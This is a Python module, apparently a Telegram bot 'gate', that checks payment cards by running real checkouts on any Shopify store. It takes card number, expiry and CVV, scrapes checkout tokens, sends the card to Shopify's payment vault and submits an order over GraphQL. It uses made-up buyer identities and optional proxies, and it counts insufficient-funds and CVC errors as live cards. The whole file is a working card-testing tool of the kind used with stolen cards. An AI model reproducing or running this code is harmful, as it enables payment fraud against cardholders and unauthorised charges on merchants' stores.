# ============================================================
#  Shopify GraphQL Checkout Gate — ported from Dux.py
#  Direct Shopify checkout via products.json + GraphQL
#  User provides a Shopify site URL
# ============================================================

import re
import json
import random
import time
import requests
import logging
from urllib.parse import urlparse

logging.basicConfig(level=logging.ERROR)
logger = logging.getLogger(__name__)

US_ADDRESSES = [
    {"add1": "123 Main St", "city": "Portland", "state_short": "ME", "zip": "04101"},
    {"add1": "456 Oak Ave", "city": "Portland", "state_short": "ME", "zip": "04102"},
    {"add1": "789 Pine Rd", "city": "Portland", "state_short": "ME", "zip": "04103"},
    {"add1": "321 Elm St", "city": "Bangor", "state_short": "ME", "zip": "04401"},
    {"add1": "654 Maple Dr", "city": "Lewiston", "state_short": "ME", "zip": "04240"},
]

FIRST_NAMES = ["John", "Emily", "Alex", "Sarah", "Michael", "Jessica", "James", "Anna"]
LAST_NAMES = ["Smith", "Johnson", "Williams", "Brown", "Davis", "Miller", "Wilson", "Taylor"]


def _find_between(s, start, end):
    try:
        if start in s and end in s:
            return s.split(start)[1].split(end)[0]
        return ""
    except Exception:
        return ""


def _get_bin_info(bin6):
    default = {
        "brand": "UNKNOWN", "type": "UNKNOWN",
        "bank": "UNKNOWN", "country": "UNKNOWN", "emoji": "🏳️",
    }
    try:
        r = requests.get(f"https://api.voidex.dev/api/bin?bin={bin6}", timeout=8)
        if r.status_code == 200:
            d = r.json()
            if d and "brand" in d:
                return {
                    "brand": d.get("brand", "UNKNOWN"),
                    "type": d.get("type", "UNKNOWN"),
                    "bank": d.get("bank", "UNKNOWN"),
                    "country": d.get("country_name", "UNKNOWN"),
                    "emoji": d.get("country_flag", "🏳️"),
                }
    except Exception:
        pass
    return default


def _get_random_info():
    addr = random.choice(US_ADDRESSES)
    fname = random.choice(FIRST_NAMES)
    lname = random.choice(LAST_NAMES)
    email = f"{fname.lower()}.{lname.lower()}{random.randint(1, 999)}@gmail.com"
    phone = f"207{random.randint(1000000, 9999999)}"
    return {
        "fname": fname, "lname": lname, "email": email, "phone": phone,
        **addr,
    }


def _process_card(cc, mm, yy, cvv, site_url, proxy_dict=None):
    """Full Shopify GraphQL checkout."""
    try:
        session = requests.Session()
        ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36'
        session.headers.update({'User-Agent': ua})

        if proxy_dict:
            session.proxies.update(proxy_dict)

        # Step 1: Get products
        try:
            prod_resp = session.get(f"{site_url}/products.json", timeout=20)
        except (requests.exceptions.ProxyError, requests.exceptions.ConnectionError):
            session.proxies = {}
            prod_resp = session.get(f"{site_url}/products.json", timeout=20)

        if prod_resp.status_code != 200:
            return {"status": "Error", "response": f"Products HTTP {prod_resp.status_code}"}

        try:
            products = prod_resp.json().get('products', [])
        except Exception:
            return {"status": "Error", "response": "Invalid products JSON"}

        if not products:
            return {"status": "Error", "response": "No products found"}

        product = products[0]
        if not product.get('variants'):
            return {"status": "Error", "response": "No variants"}

        variant_id = product['variants'][0]['id']
        price = product['variants'][0].get('price', '?')
        product_title = product.get('title', 'Unknown')

        # Step 2: Add to cart
        add_resp = session.post(
            f"{site_url}/cart/add.js",
            data={'id': str(variant_id), 'quantity': '1'},
            timeout=15,
        )
        if add_resp.status_code != 200:
            return {"status": "Error", "response": f"Cart add failed ({add_resp.status_code})"}

        # Get cart token
        cart_resp = session.get(f"{site_url}/cart.js", timeout=15)
        try:
            cart_data = cart_resp.json()
            cart_token = cart_data.get('token', '')
        except Exception:
            return {"status": "Error", "response": "Cart JSON parse failed"}

        # Step 3: Go to checkout — extract tokens
        checkout_resp = session.get(f"{site_url}/checkout", timeout=25, allow_redirects=True)
        checkout_html = checkout_resp.text

        # Session token
        session_token_match = re.search(
            r'name="serialized-sessionToken"\s+content="&quot;([^"]+)&quot;"',
            checkout_html,
        )
        if not session_token_match:
            # Try alternate pattern
            session_token_match = re.search(r'sessionToken["\']?\s*:\s*["\']([^"\']+)["\']', checkout_html)
        if not session_token_match:
            return {"status": "Error", "response": "Session token not found"}
        session_token = session_token_match.group(1)

        # Queue token
        queue_token = _find_between(checkout_html, 'queueToken&quot;:&quot;', '&quot;')
        if not queue_token:
            queue_token = _find_between(checkout_html, 'queueToken":"', '"')

        # Stable ID
        stable_id = _find_between(checkout_html, 'stableId&quot;:&quot;', '&quot;')
        if not stable_id:
            stable_id = _find_between(checkout_html, 'stableId":"', '"')

        # Payment method identifier
        payment_method = _find_between(checkout_html, 'paymentMethodIdentifier&quot;:&quot;', '&quot;')
        if not payment_method:
            payment_method = _find_between(checkout_html, 'paymentMethodIdentifier":"', '"')

        if not queue_token or not stable_id or not payment_method:
            return {"status": "Error", "response": "Checkout tokens missing"}

        # Step 4: Create payment session on Shopify
        year_full = f"20{yy}" if len(yy) <= 2 else yy
        info = _get_random_info()
        domain = urlparse(site_url).netloc

        pay_session_data = {
            'credit_card': {
                'number': cc, 'month': mm, 'year': year_full,
                'verification_value': cvv,
                'name': f"{info['fname']} {info['lname']}",
            },
            'payment_session_scope': domain,
        }
        pay_headers = {
            'Content-Type': 'application/json',
            'Accept': 'application/json',
            'Origin': 'https://checkout.shopifycs.com',
        }
        pay_resp = requests.post(
            "https://deposit.us.shopifycs.com/sessions",
            json=pay_session_data, headers=pay_headers, timeout=15,
        )
        if pay_resp.status_code != 200:
            return {"status": "Error", "response": f"Payment session failed ({pay_resp.status_code})"}

        try:
            session_id = pay_resp.json().get('id')
        except Exception:
            return {"status": "Error", "response": "Payment session parse failed"}

        if not session_id:
            return {"status": "Error", "response": "No session ID"}

        # Step 5: Submit via GraphQL
        gql_url = f"{site_url}/checkouts/unstable/graphql"
        gql_headers = {
            'authority': domain,
            'accept': 'application/json',
            'content-type': 'application/json',
            'origin': site_url,
            'user-agent': ua,
            'x-checkout-one-session-token': session_token,
            'x-checkout-web-source-id': cart_token,
        }

        gql_payload = {
            'query': 'mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!,$analytics:AnalyticsInput){submitForCompletion(input:$input attemptToken:$attemptToken analytics:$analytics){...on SubmitSuccess{receipt{...on ProcessedReceipt{id token}...on ProcessingReceipt{id pollDelay}...on FailedReceipt{id processingError{code}}}}...on SubmitRejected{errors{code}}...on Throttled{pollAfter queueToken}}}',
            'variables': {
                'input': {
                    'sessionInput': {'sessionToken': session_token},
                    'queueToken': queue_token,
                    'delivery': {
                        'deliveryLines': [{
                            'targetMerchandiseLines': {'lines': [{'stableId': stable_id}]},
                            'destination': {
                                'streetAddress': {
                                    'address1': info['add1'], 'city': info['city'],
                                    'countryCode': 'US', 'postalCode': info['zip'],
                                    'firstName': info['fname'], 'lastName': info['lname'],
                                    'zoneCode': info['state_short'], 'phone': info['phone'],
                                }
                            }
                        }]
                    },
                    'merchandise': {
                        'merchandiseLines': [{
                            'stableId': stable_id,
                            'merchandise': {
                                'productVariantReference': {
                                    'id': f'gid://shopify/ProductVariantMerchandise/{variant_id}',
                                    'variantId': f'gid://shopify/ProductVariant/{variant_id}',
                                }
                            },
                            'quantity': {'items': {'value': 1}},
                        }]
                    },
                    'payment': {
                        'paymentLines': [{
                            'paymentMethod': {
                                'directPaymentMethod': {
                                    'paymentMethodIdentifier': payment_method,
                                    'sessionId': session_id,
                                    'billingAddress': {
                                        'streetAddress': {
                                            'address1': info['add1'], 'city': info['city'],
                                            'countryCode': 'US', 'postalCode': info['zip'],
                                            'firstName': info['fname'], 'lastName': info['lname'],
                                            'zoneCode': info['state_short'], 'phone': info['phone'],
                                        }
                                    }
                                }
                            }
                        }]
                    },
                    'buyerIdentity': {
                        'contactInfoV2': {
                            'emailOrSms': {'value': info['email']}
                        }
                    }
                },
                'attemptToken': f'{cart_token}-{random.random()}',
                'analytics': {
                    'requestUrl': f'{site_url}/checkouts/cn/{cart_token}',
                    'pageId': f"{random.randint(10000000, 99999999):08x}",
                },
            },
        }

        gql_resp = session.post(gql_url, json=gql_payload, headers=gql_headers, timeout=30)

        if gql_resp.status_code != 200:
            return {"status": "Error", "response": f"GraphQL HTTP {gql_resp.status_code}"}

        try:
            result_data = gql_resp.json()
        except Exception:
            return {"status": "Error", "response": "GraphQL JSON parse failed"}

        completion = result_data.get('data', {}).get('submitForCompletion', {})

        # Check receipt
        receipt = completion.get('receipt', {})
        if receipt:
            receipt_type = receipt.get('__typename', '')
            error_info = receipt.get('processingError', {})

            if receipt_type == 'ProcessedReceipt':
                return {
                    "status": "Approved",
                    "response": f"Charged ${price} 💎 | {product_title}",
                    "price": price, "product": product_title,
                }
            elif receipt_type == 'ProcessingReceipt':
                return {
                    "status": "Approved",
                    "response": f"Processing ${price} ⏳ | {product_title}",
                    "price": price, "product": product_title,
                }
            elif receipt_type == 'FailedReceipt':
                code = error_info.get('code', 'Unknown')
                # Some "failures" are actually approvals
                if code.lower() in ('insufficient_funds', 'incorrect_cvc', 'invalid_cvc'):
                    return {"status": "Approved", "response": f"{code} ✅ | ${price}"}
                return {"status": "Declined", "response": f"{code} | ${price}"}

        # Check errors
        errors = completion.get('errors', [])
        if errors:
            codes = [e.get('code', '?') for e in errors]
            return {"status": "Declined", "response": f"Rejected: {', '.join(codes)}"}

        # Throttled
        if 'pollAfter' in str(completion):
            return {"status": "Error", "response": "Throttled — try again later"}

        return {"status": "Declined", "response": "Unknown checkout response"}

    except Exception as e:
        return {"status": "Error", "response": str(e)[:80]}


# ── Public API ──────────────────────────────────────────────

def check_card(cc_line, proxy_dict=None, site_url=None):
    """Entry point for TG bot gate.
    cc_line: "CC|MM|YY|CVV"
    site_url: Shopify site URL (required)
    Returns formatted result string.
    """
    if not site_url:
        return "Error | No site URL — use /shochk URL CC|MM|YY|CVV"

    if not site_url.startswith(('http://', 'https://')):
        site_url = 'https://' + site_url
    site_url = site_url.rstrip('/')

    start = time.time()
    parts = cc_line.strip().split('|')
    if len(parts) != 4:
        return "Error | Invalid format (CC|MM|YY|CVV)"

    cc, mm, yy, cvv = [p.strip() for p in parts]
    result = _process_card(cc, mm, yy, cvv, site_url, proxy_dict)
    elapsed = time.time() - start

    status = result.get("status", "Error")
    response = result.get("response", "Unknown")
    bin_info = _get_bin_info(cc[:6])

    if status == "Approved":
        return (
            f"Approved | {response}\n"
            f"Card: {cc}|{mm}|{yy}|{cvv}\n"
            f"Gateway: Shopify GraphQL\n"
            f"Site: {site_url}\n"
            f"BIN: {bin_info['brand']} - {bin_info['type']}\n"
            f"Bank: {bin_info['bank']}\n"
            f"Country: {bin_info['country']} {bin_info['emoji']}\n"
            f"Time: {elapsed:.1f}s"
        )
    elif status == "Declined":
        return (
            f"Declined | {response}\n"
            f"Card: {cc}|{mm}|{yy}|{cvv}\n"
            f"Gateway: Shopify GraphQL\n"
            f"Site: {site_url}\n"
            f"BIN: {bin_info['brand']} - {bin_info['type']}\n"
            f"Time: {elapsed:.1f}s"
        )
    else:
        return f"Error | {response}"


def probe_site(site_url=None):
    """Health check for Shopify site."""
    if not site_url:
        return True, "User provides site URL"
    try:
        r = requests.get(
            f"{site_url}/products.json",
            headers={"User-Agent": "Mozilla/5.0"},
            timeout=10,
        )
        alive = r.status_code == 200
        try:
            products = r.json().get('products', [])
            return alive, f"HTTP {r.status_code} | {len(products)} products"
        except Exception:
            return alive, f"HTTP {r.status_code}"
    except Exception as e:
        return False, str(e)[:60]
